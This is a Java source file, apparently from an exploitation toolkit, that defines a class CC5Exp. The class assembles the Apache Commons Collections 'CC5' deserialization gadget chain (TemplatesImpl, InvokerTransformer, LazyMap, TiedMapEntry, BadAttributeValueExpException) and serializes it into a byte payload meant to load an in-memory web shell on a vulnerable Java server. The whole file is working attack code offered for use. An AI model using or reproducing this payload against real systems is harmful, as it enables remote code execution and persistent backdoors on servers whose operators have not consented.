package sample.exploit.payload;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.CannotCompileException;
import javassist.NotFoundException;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import sample.utils.ExpUtils;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

public class CC5Exp{
    public String memShell;
    public Class<?> memShellRunner;

    public CC5Exp(String memShell){
        this.memShell = memShell;
        this.memShellRunner = ExpUtils.getMemShellRunner(memShell);
    }
    public byte[] exploit() throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, ClassNotFoundException, IllegalAccessException {
        TemplatesImpl templates = ExpUtils.getTemplatesImpl(memShell, memShellRunner);
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);
        Map hashmap = new HashMap();
        Map lazyMap = LazyMap.decorate(hashmap, invokerTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templates);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        ExpUtils.setField(badAttributeValueExpException, "val", tiedMapEntry);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(badAttributeValueExpException);
        oos.flush();
        oos.close();
        return baos.toByteArray();
    }
}
